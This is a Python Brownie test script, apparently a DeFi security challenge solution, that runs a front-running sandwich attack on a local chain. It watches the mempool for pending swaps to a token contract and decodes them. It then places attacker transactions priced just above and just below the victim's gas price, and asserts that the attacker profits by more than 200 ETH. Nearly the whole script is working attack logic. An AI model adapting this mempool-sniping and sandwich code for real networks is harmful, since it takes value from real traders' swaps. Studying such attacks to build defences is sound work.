from web3 import Web3
from brownie import accounts
from scripts.FrontRunner_helper import *
from time import sleep
#import contextlib
#import io

#@pytest.fixture
def test_frontrunning():
    yellow ='\x1b[0;33m'
    green ='\x1b[0;32m'
    red='\x1b[0;31m'
    nocolor='\x1b[0;m'

    # Adding 100 accounts
    accts=[]
    for _ in range(0, 10):
        accts.append(accounts.add())    

    print(red,"\r[ * ] \x1b[0;43m0xm4ud FRONT RUNNER 3000\x1b[0;m")
    print(red,"\r[ * ]\x1b[0;m RICKY BOBBY says: I WANNA GO FAST!!!",nocolor)

    signers = [deployer, user1, user2, attacker]
    w3 = Web3(Web3.HTTPProvider())
    #2.5 ETH (ETH -> WEI -> Hexdecimal)
    # the evm_setAccountBalance json-rcp call equivalent in hardhat is hardhat_setBalance
    # 300 ETH for each signer
    for _ in range(0, len(signers)): 
        w3.provider.make_request("evm_setAccountBalance", [signers[_].address, "0x1043561A8829300000"])
 
    attackerInitialETHBalance = attacker.balance()

    #Add liquidity to the contract Chocolcate
    print(green,"\r[ + ]\x1b[0;m Adding liquidity to the contract",nocolor)
    chocolate.approve(chocolate.address, INITIAL_LIQUIDITY, {'from': deployer,'gas_price': 0x4133110a0})
    chocolate.addChocolateLiquidity(INITIAL_LIQUIDITY, {'from': deployer, 'value': ETH_IN_LIQUIDITY,'gas_price': 0x4133110a0})

    print(green,"\r[ + ]\x1b[0;m Simmulating SWAP n1",nocolor)
    #User1 swaps 120 ETH to Chocolate
    chocolate.swapChocolates(
        weth.address, 
        USER1_SWAP, 
        {
        'value': USER1_SWAP, 
        'from': user1, 
        'gas_price': 0x4133810a0,
        'required_confs':0
        }
    )
    print(green,"\r[ + ]\x1b[0;m Simmulating SWAP n2",nocolor)
    #User2 swaps 100 ETH to Chocolate
    chocolate.swapChocolates(
        weth.address, 
        USER2_SWAP, 
        {
        'value': USER2_SWAP, 
        'from': user2, 
        'gas_price': 0x4133110a0,
        'required_confs':0
        }
    )
    print(green,"\r[ + ]\x1b[0;m Adding noise to mempool",nocolor)
    #Add noise to the mempool
    for _ in range(0,10):
        deployer.transfer(
                accts[_].address,
                    0.1, 
                    required_confs=0,
                    gas_price= 0x4133110a0
                    )

    #Get pending transactions from MemPool
    def get_pending_transactions(w3):
        ptx = w3.provider.make_request("txpool_content", [])
        ptx_from = ptx['result']['pending']
        return ptx_from

    def find_transactions_by_address(ptx_from, target_address):
        transactions =[]
        for sender, txs in ptx_from.items():
            for nonce, tx in txs.items():
                if tx['to'].lower() == target_address.lower():
                    transactions.append(tx)
        return transactions

    w3 = Web3(Web3.HTTPProvider())  # Replace with your own provider URL
    # Replace with the actual address you're looking for
    target_address = chocolate.address  # <-- Change this


    def sandwich_attack(tx):
        sandwichContract.sandwich(True, {'from': attacker, 'value': purchaseWith, 'gas_price': int(tx['gasPrice'], 16) + 1, 'required_confs':0}) 
        sandwichContract.sandwich(False, {'from': attacker, 'gas_price': int(tx['gasPrice'], 16) - 1, 'required_confs':0})

    print("\x1b[0;32m[ * ]\x1b[0;m Searching for TX...")
    found_and_processed = False
    while not found_and_processed:
        print("\x1b[0;32m[ + ]\x1b[0;m Attempting to find transactions...")
        ptx_from = get_pending_transactions(w3)
        transactions = find_transactions_by_address(ptx_from, target_address)
        num_transactions = len(transactions)

        if num_transactions > 0:
            for _ in range(num_transactions):
                tx = transactions.pop(0)  # Get and remove the first transaction from the list

                print("\x1b[0;32m[ √ ]\x1b[0;m Found target:\x1b[0;34m", tx['to'])
                parsedTx = chocolateInterface.decode_input(tx['input'])

                if parsedTx[0] != "swapChocolates(address,uint256)": 
                    print("\x1b[0;31m[ x ]\x1b[0;m Wrong Signature")
                    continue

                if parsedTx[1][0] != WETH_ADDRESS: 
                    continue
                else:
                    purchaseWith = attacker.balance() - 10**18  
                    print("\x1b[0;34m[ √ ] Found WETH")
                    print("\x1b[0;32m[ √ ]\x1b[0;m Got TX",_,",\x1b[0;32m$$\x1b[0;m Bling\x1b[0;32m $$\x1b[0;m Sandwich time!!")
                    sandwich_attack(tx)

            else:
                print("\x1b[0;31m[ x ]\x1b[0;m No matching transactions in current batch, leaving\x1b[0;31m [ x ]\x1b[0;m ")
                found_and_processed = True
                #sleep(2)  # Add a delay of 5 seconds before re-fetching pending transactions
        else:
            print("\x1b[0;31m[ x ]\x1b[0;m No matching TX found, leaving\x1b[0;31m [ x ]\x1b[0;m ")
            found_and_processed = True
            sleep(2)  # Add a delay of 5 seconds before re-fetching pending transactions


    print("\x1b[0;32m[ * ]\x1b[0;m Mining block...")
    w3.provider.make_request("evm_mine", [])
    sleep(2)
    attackerETHBalance = attacker.balance()
    print("\x1b[0;32m[ + ]\x1b[0;m Attacker ETH Balance: ", attackerETHBalance)
    assert(attackerETHBalance > attackerInitialETHBalance +  Wei("200 ether"))
    print("\x1b[0;32m[ $$ ]\x1b[0;34m Front Running Successful!\x1b[0;32m [ $$ ]\x1b[0;m")